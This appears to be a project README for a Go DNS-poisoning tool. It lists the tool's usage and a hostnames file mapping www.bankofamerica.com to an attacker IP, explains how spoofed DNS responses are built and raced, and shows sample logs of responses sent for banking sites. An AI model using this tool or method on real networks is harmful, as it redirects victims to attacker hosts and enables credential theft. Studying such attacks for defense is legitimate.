# DNS_poison_attack
On-path DNS poisoning attack tool.

Specification
sudo go run dnspoison.go [-i interface] [-f hostnames] [expression]
NOTE: PLEASE TYPE THE FULL URL WITH "WWW" IN THE SEARCH BOX IN WEB BROWSER. EG. www.tcpdump.org , www.bankofamerica.com

Usage:
The code takes 3 parameters

1) -i interface.
The interface to be monitored can be specified. Default interface is found by FindAllDevs, if no interface is specified. Invalid interface 
name will produce errors.

2) -f hostnames
hostnames txt file provides the addresses that need to be spoofed with the IP address of the attacker. If hostname file is not mentioned, the 
program will poison all the requests.
example: sample.txt
192.168.2.128 www.tcpdump.org
192.168.2.128 www.bankofamerica.com

3) BPF expression
If a BPF expression is provided, then the network traffic will be filtered based on the filter expression. Enter the BPF filter in quotes.

Just like tcpdump, there is no particular order in which the parameters need to be entered.
The program needs to run in sudo to avoid permission realted errors.
NOTE: PLEASE TYPE THE FULL URL WITH "WWW" IN THE SEARCH BOX.

Implementation Details:
Once all the parameters are gathered from the command line arguments, there a the poison function works in the following manner:
- BPF filter is applied and the interface is detected if it is not already provided by the user.
- Layers are extracted from the packet.
- Question and answer layer is obtained form the DNS layer.
- A new pacet is created where the destination and sourse IP, MAC and port are swapped.
- The answer is modified and the attacker's IP is added.
- The new packet is sent to the victim.
- If the spoofed packet reached the victim before the true packet, the the attack is successful.

Output sample
1) sudo go run dnspoison.go -f sample.txt
interface=  ens33
hostfile=  sample.txt
bpfstr=  
map: map[www.bankofamerica.com:192.168.2.128 www.tcpdump.org:192.168.2.128]
Packet captured. Checking Request...
Request :  teredo.ipv6.microsoft.com
Packet captured. Checking Request...
Request :  www.google.com
Packet captured. Checking Request...
Request :  www.gstatic.com
Packet captured. Checking Request...
Request :  content-autofill.googleapis.com
Packet captured. Checking Request...
Request :  www.yahoo.com
Packet captured. Checking Request...
Request :  s.yimg.com
Packet captured. Checking Request...
Request :  search.yahoo.com
Packet captured. Checking Request...
Request :  www.tcpdump.org
Response sent
Packet captured. Checking Request...
Request :  udc.yahoo.com
Packet captured. Checking Request...
Request :  pagead2.googlesyndication.com
Packet captured. Checking Request...
Request :  service.idsync.analytics.yahoo.com
Packet captured. Checking Request...
Request :  us-east-1.onemobile.yahoo.com
Packet captured. Checking Request...
Request :  cms.analytics.yahoo.com
Packet captured. Checking Request...
Request :  ups.analytics.yahoo.com
Packet captured. Checking Request...
Request :  www.bankofamerica.com
Response sent

As seen in the output, response is sent to www.bankofamerica.com and www.tcpdump.org .

2) sudo go run dnspoison.go
Packet captured. Checking Request...
Request :  translate.googleapis.com
Response sent
Packet captured. Checking Request...
Request :  www.google.com
Response sent
Packet captured. Checking Request...
Request :  www.tcpdump.org
Response sent
Packet captured. Checking Request...
Request :  www.gstatic.com
Response sent
Packet captured. Checking Request...
Request :  www.bankofamerica.com
Response sent
Packet captured. Checking Request...
Request :  teredo.ipv6.microsoft.com
Response sent
Packet captured. Checking Request...
Request :  www.chase.com
Response sent
Packet captured. Checking Request...
Request :  www.wellsfargo.com
Response sent
